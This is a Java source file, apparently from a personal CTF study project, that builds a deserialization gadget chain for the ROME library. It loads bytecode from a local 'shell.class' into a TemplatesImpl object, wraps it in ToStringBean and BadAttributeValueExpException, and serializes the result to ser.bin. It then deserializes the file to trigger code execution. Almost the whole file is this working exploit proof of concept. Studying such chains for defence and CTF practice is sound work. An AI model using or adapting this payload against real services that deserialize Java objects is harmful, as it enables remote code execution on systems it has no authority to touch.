package org.example;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ToStringBean;
import org.apache.commons.collections4.functors.ConstantTransformer;
import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.lang.reflect.Field;

public class BadAttributeValueExpExceptionTest {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        byte[] bytes = Files.readAllBytes(Paths.get("D:\\ctf_tools\\java_study\\rome\\shell.class"));
        setValue(templates,"_name","aaa");
        setValue(templates,"_bytecodes",new byte[][]{bytes});
        setValue(templates,"_tfactory",new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1));
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
        Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException,toStringBean);
        setValue(toStringBean,"_obj",templates);
        serialize(badAttributeValueExpException);
        unserialize("ser.bin");
    }

    private static void setValue(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
